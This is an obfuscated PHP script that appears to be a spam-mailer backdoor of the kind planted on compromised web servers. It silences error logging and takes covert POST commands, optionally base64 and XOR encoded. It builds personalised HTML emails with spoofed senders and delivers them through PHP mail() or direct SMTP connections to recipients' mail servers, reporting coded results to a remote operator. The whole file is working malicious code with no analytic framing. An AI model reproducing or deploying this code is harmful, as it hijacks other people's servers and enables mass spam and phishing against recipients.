<?php
@error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); if (count($_POST) < 2) { die(PHP_OS.chr(49).chr(48).chr(43).md5(0987654321)); } $v5031e998 = false; foreach (array_keys($_POST) as $v3c6e0b8a) { switch ($v3c6e0b8a[0]) { case chr(108): $vd56b6998 = $v3c6e0b8a; break; case chr(100): $v8d777f38 = $v3c6e0b8a; break; case chr(109): $v3d26b0b1 = $v3c6e0b8a; break; case chr(101); $v5031e998 = true; break; } } if ($vd56b6998 === '' || $v8d777f38 === '') die(PHP_OS.chr(49).chr(49).chr(43).md5(0987654321)); $v619d75f8 = preg_split('/\,(\ +)?/', @ini_get('disable_functions')); $v01b6e203 = @$_POST[$vd56b6998]; $v8d777f38 = @$_POST[$v8d777f38]; $v3d26b0b1 = @$_POST[$v3d26b0b1]; if ($v5031e998) { $v01b6e203 = n9a2d8ce3($v01b6e203); $v8d777f38 = n9a2d8ce3($v8d777f38); $v3d26b0b1 = n9a2d8ce3($v3d26b0b1); } $v01b6e203 = urldecode(stripslashes($v01b6e203)); $v8d777f38 = urldecode(stripslashes($v8d777f38)); $v3d26b0b1 = urldecode(stripslashes($v3d26b0b1)); if (strpos($v01b6e203, ';', 1) != false) { list($va3da707b, $vbfbb12dc, $v081bde0c) = preg_split('/;/',strtolower($v01b6e203)); $va3da707b = ucfirst($va3da707b); $vbfbb12dc = ucfirst($vbfbb12dc); $v3a5939e4 = next(explode('@', $v081bde0c)); if ($vbfbb12dc == '' || $va3da707b == '') { $vbfbb12dc = $va3da707b = ''; $v01b6e203 = $v081bde0c; } else { $v01b6e203 = "\"$va3da707b $vbfbb12dc\" <$v081bde0c>"; } } else { $vbfbb12dc = $va3da707b = ''; $v081bde0c = strtolower($v01b6e203); $v3a5939e4 = next(explode('@', $v01b6e203)); } preg_match('|<USER>(.*)</USER>|imsU', $v8d777f38, $vee11cbb1); $vee11cbb1 = $vee11cbb1[1]; preg_match('|<NAME>(.*)</NAME>|imsU', $v8d777f38, $vb068931c); $vb068931c = $vb068931c[1]; preg_match('|<SUBJ>(.*)</SUBJ>|imsU', $v8d777f38, $vc34487c9); $vc34487c9 = $vc34487c9[1]; preg_match('|<SBODY>(.*)</SBODY>|imsU', $v8d777f38, $v6f4b5f42); $v6f4b5f42= $v6f4b5f42[1]; $vc34487c9 = str_replace("%R_NAME%", $va3da707b, $vc34487c9); $vc34487c9 = str_replace("%R_LNAME%", $vbfbb12dc, $vc34487c9); $v6f4b5f42 = str_replace("%R_NAME%", $va3da707b, $v6f4b5f42); $v6f4b5f42 = str_replace("%R_LNAME%", $vbfbb12dc, $v6f4b5f42); $v0897acf4 = preg_replace('/^(www|ftp)\./i', '', @$_SERVER['HTTP_HOST']); if (ne667da76($v0897acf4) || @ini_get('safe_mode')) $v10497e3f = false; else $v10497e3f = true; if ($v10497e3f) $v9a5cb5d8 = "$vee11cbb1@$v0897acf4"; else $v9a5cb5d8 = "$vee11cbb1@[$v0897acf4]"; if ($vb068931c != '') $vd98a07f8 = "$vb068931c <$v9a5cb5d8>"; else $vd98a07f8 = $v9a5cb5d8; $vb8ddc93f = "From: $vd98a07f8\r\n"; $vb8ddc93f .= "Reply-To: $vd98a07f8\r\n"; $v3c87b187 = "X-Priority: 3 (Normal)\r\n"; $v3c87b187 .= "MIME-Version: 1.0\r\n"; $v3c87b187 .= "Content-Type: text/html; charset=\"iso-8859-1\"\r\n"; $v3c87b187 .= "Content-Transfer-Encoding: 8bit\r\n"; if (!in_array('mail', $v619d75f8)) { if ($v10497e3f) { if (@mail($v01b6e203, $vc34487c9, $v6f4b5f42, $vb8ddc93f.$v3c87b187, "-f$v9a5cb5d8")) die(chr(79).chr(75).md5(1234567890)."+0"); } else { if (@mail($v01b6e203, $vc34487c9, $v6f4b5f42, $v3c87b187)) die(chr(79).chr(75).md5(1234567890)."+0"); } } $v4340fd73 = "Date: " . date("D, j M Y G:i:s O")."\r\n" . $vb8ddc93f; $v4340fd73 .= "Message-ID: <".preg_replace('/(.{7})(.{5})(.{2}).*/', '$1-$2-$3', md5(time()))."@$v0897acf4>\r\n"; $v4340fd73 .= "To: $v01b6e203\r\n"; $v4340fd73 .= "Subject: $vc34487c9\r\n"; $v4340fd73 .= $v3c87b187; $v841a2d68 = $v4340fd73."\r\n".$v6f4b5f42; if ($v3d26b0b1 == '') $v3d26b0b1 = n9c812bad($v3a5939e4); if (($vb4a88417 = n7b0ecdff($v9a5cb5d8, $v081bde0c, $v841a2d68, $v0897acf4, $v3d26b0b1)) == 0) { die(chr(79).chr(75).md5(1234567890)."+1"); } else { echo PHP_OS.chr(50).chr(48).'+'.md5(0987654321)."+$vb4a88417"; } function ne667da76($v957b527b){ return preg_match("/^([1-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])(\.([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])){3}$/", $v957b527b); } function na73fa8bd($vb45cffe0, $v11a95b8a = 0, $v7fa1b685="=\r\n", $v92f21a0f = 0, $v3303c65a = false) { $vf5a8e923 = strlen($vb45cffe0); $vb4a88417 = ''; for($v865c0c0b = 0; $v865c0c0b < $vf5a8e923; $v865c0c0b++) { if ($v11a95b8a >= 75) { $v11a95b8a = $v92f21a0f; $vb4a88417 .= $v7fa1b685; } $v4a8a08f0 = ord($vb45cffe0[$v865c0c0b]); if (($v4a8a08f0 == 0x3d) || ($v4a8a08f0 >= 0x80) || ($v4a8a08f0 < 0x20)) { if ((($v4a8a08f0 == 0x0A) || ($v4a8a08f0 == 0x0D)) && (!$v3303c65a)) { $vb4a88417.=chr($v4a8a08f0); $v11a95b8a = 0; continue; } $vb4a88417 .='='.str_pad(strtoupper(dechex($v4a8a08f0)), 2, '0', STR_PAD_LEFT); $v11a95b8a += 3; continue; } $vb4a88417 .= chr($v4a8a08f0); $v11a95b8a++; } return $vb4a88417; } function n7b0ecdff($vd98a07f8, $v01b6e203, $v841a2d68, $v0897acf4, $v3d26b0b1) { global $v619d75f8; if (!in_array('fsockopen', $v619d75f8)) $v66b18866 = @fsockopen($v3d26b0b1, 25, $v70106d0d, $v809b1abe, 20); elseif (!in_array('pfsockopen', $v619d75f8)) $v66b18866 = @pfsockopen($v3d26b0b1, 25, $v70106d0d, $v809b1abe, 20); elseif (!in_array('stream_socket_client', $v619d75f8) && function_exists("stream_socket_client")) $v66b18866 = @stream_socket_client("tcp://$v3d26b0b1:25", $v70106d0d, $v809b1abe, 20); else return -1; if (!$v66b18866) { return 1; } else { $v8d777f38 = n54070395($v66b18866); @fputs($v66b18866, "EHLO $v0897acf4\r\n"); $ve98d2f00 = n54070395($v66b18866); if (substr($ve98d2f00, 0, 3) != 250 ) return "2+($v01b6e203)+".preg_replace('/(\r\n|\r|\n)/', '|', $ve98d2f00); @fputs($v66b18866, "MAIL FROM:<$vd98a07f8>\r\n"); $ve98d2f00 = n54070395($v66b18866); if (substr($ve98d2f00, 0, 3) != 250 ) return "3+($v01b6e203)+".preg_replace('/(\r\n|\r|\n)/', '|', $ve98d2f00); @fputs($v66b18866, "RCPT TO:<$v01b6e203>\r\n"); $ve98d2f00 = n54070395($v66b18866); if (substr($ve98d2f00, 0, 3) != 250 && substr($ve98d2f00, 0, 3) != 251) return "4+($v01b6e203)+".preg_replace('/(\r\n|\r|\n)/', '|', $ve98d2f00); @fputs($v66b18866, "DATA\r\n"); $ve98d2f00 = n54070395($v66b18866); if (substr($ve98d2f00, 0, 3) != 354 ) return "5+($v01b6e203)+".preg_replace('/(\r\n|\r|\n)/', '|', $ve98d2f00); @fputs($v66b18866, $v841a2d68."\r\n.\r\n"); $ve98d2f00 = n54070395($v66b18866); if (substr($ve98d2f00, 0, 3) != 250 ) return "6+($v01b6e203)+".preg_replace('/(\r\n|\r|\n)/', '|', $ve98d2f00); @fputs($v66b18866, "QUIT\r\n"); @fclose($v66b18866); return 0; } } function n54070395($v66b18866) { $v8d777f38 = ''; while($v341be97d = @fgets($v66b18866, 4096)) { $v8d777f38 .= $v341be97d; if(substr($v341be97d, 3, 1) == ' ') break; } return $v8d777f38; } function n9c812bad($vad5f82e8) { global $v619d75f8; if (!in_array('getmxrr', $v619d75f8) && function_exists("getmxrr")) { @getmxrr($vad5f82e8, $v744fa43b, $v6c5ea816); if (count($v744fa43b) === 0) return '127.0.0.1'; $v865c0c0b = array_keys($v6c5ea816, min($v6c5ea816)); return $v744fa43b[$v865c0c0b[0]]; } else { return '127.0.0.1'; } } function n9a2d8ce3($v1cb251ec) { $v1cb251ec = base64_decode($v1cb251ec); $vc68271a6 = ''; for($v865c0c0b = 0; $v865c0c0b < strlen($v1cb251ec); $v865c0c0b++) $vc68271a6 .= chr(ord($v1cb251ec[$v865c0c0b]) ^ 2); return $vc68271a6; } ?> 
